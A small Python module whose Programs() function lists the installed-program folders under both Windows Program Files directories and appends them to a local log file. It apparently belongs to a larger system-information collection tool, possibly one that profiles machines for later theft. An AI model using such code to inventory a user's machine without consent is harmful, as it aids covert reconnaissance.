from os import listdir
from os.path import join
from manager.logger import Log
from preferences.config import config

def Programs():
    path = "C:\\Program Files (x86)"
    path1 = "C:\\Program Files"
    pathToLogs = join(config.pathToLogs, "System", "Programs.txt")
    try:
        dirs = listdir(path)
        with open(pathToLogs, "a", encoding="utf-8") as prog:
            prog.write(path+"\n")
            prog.write("\n".join(dirs))

        dirs = listdir(path1)
        with open(pathToLogs, "a", encoding="utf-8") as prog:
            prog.write(path1+"\n")
            prog.write("\n".join(dirs))
    except Exception as e:
        Log(f"Programs ---> {e}")